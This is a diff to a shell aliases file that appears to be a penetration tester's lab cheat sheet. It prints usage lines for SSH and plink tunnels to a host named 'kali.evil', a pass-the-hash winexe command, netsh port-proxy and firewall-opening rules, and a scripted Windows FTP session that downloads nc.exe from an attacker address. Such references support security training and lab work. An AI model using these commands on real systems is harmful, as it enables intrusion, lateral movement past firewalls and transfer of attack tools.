@@ -432,35 +432,46 @@ echo pth-winexe -U DOM/USER%LM_HASH:NTLM_HASH //TARGET cmd
 '
 
 alias usage-ssh-local-portfwde='
-echo ssh -N -L <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com
-echo ssh -N -L kali:445:dc1:445 kali@bounce
-echo `-- kali:445 ---> 22:bounce:Ephermal --> 445:dc1
+echo "ssh -N -L <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com"
+echo "ssh -N -L kali:445:dc1:445 kali@bounce"
+echo "-- kali:445 ---> 22:bounce:Ephermal --> 445:dc1"
 '
 
 alias usage-ssh-remote-portfwd='
-echo ssh -N -R <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com
-echo ssh -N -R kali:4444:127.0.0.1:3306 kali@kali
-echo `-- localhost:3306 <-- 4444:kali
-echo ssh -N -R kali:4444:sql:3306 kali@kali
-echo `-- sql:3306 <-- Ephemeral:localhost:22 <-- 4444:kali
+echo "ssh -N -R <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com"
+echo "ssh -N -R kali:4444:127.0.0.1:3306 kali@kali"
+echo "-- localhost:3306 <-- 4444:kali"
+echo "ssh -N -R kali:4444:sql:3306 kali@kali"
+echo "-- sql:3306 <-- Ephemeral:localhost:22 <-- 4444:kali"
 '
 alias usage-plink-remote-portfwd='
-echo cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <pass> -R <bind_addr>:<bind_port>:<target_addr>:<target_port> <proxy>
-echo cmd.exe /c echo y | plink.exe -ssh -l offsec -pw offsec -R kali.evil:1337:127.0.0.1:3306 kali.evil
-echo `-- localhost:3306 <-- 1337:kali
+echo "cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <pass> -R <bind_addr>:<bind_port>:<target_addr>:<target_port> <proxy>"
+echo "cmd.exe /c echo y | plink.exe -ssh -l offsec -pw offsec -R kali.evil:1337:127.0.0.1:3306 kali.evil"
+echo "-- localhost:3306 <-- 1337:kali"
 '
 
 alias usage-netsh-forward='
 echo # 1. Create proxy
-echo netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=<local_addr> connectport=<remote_port> connectaddress=<remote_addr>
-echo netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
+echo "netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=<local_addr> connectport=<remote_port> connectaddress=<remote_addr>"
+echo "netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110"
 echo 
 echo # 2. Create firewall rule
-echo netsh advfirewall firewall add rule name="<name>" protocol=<proto> dir=<in|out> localip=<local_addr> localport=<local_port> action=allow
-echo netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
+echo "netsh advfirewall firewall add rule name=\"<name>\" protocol=<proto> dir=<in|out> localip=<local_addr> localport=<local_port> action=allow"
+echo "netsh advfirewall firewall add rule name=\"forward_port_rule\" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow"
 echo 
-echo `-- kali:445 --> 4455:10.11.0.22:: --> 445:192.168.1.110
+echo "-- kali:445 --> 4455:10.11.0.22:: --> 445:192.168.1.110"
 '
+
+alias usage-winftp='
+echo "echo open 10.11.0.4 21 > ftp.txt"
+echo "echo USER offsec>> ftp.txt"
+echo "echo lab>> ftp.txt"
+echo "echo bin >> ftp.txt"
+echo "echo GET nc.exe >> ftp.txt"
+echo "echo bye >> ftp.txt"
+echo "ftp -v -n -s:ftp.txt"
+'
+
 
 ### logstash ###
 ### zeek ###
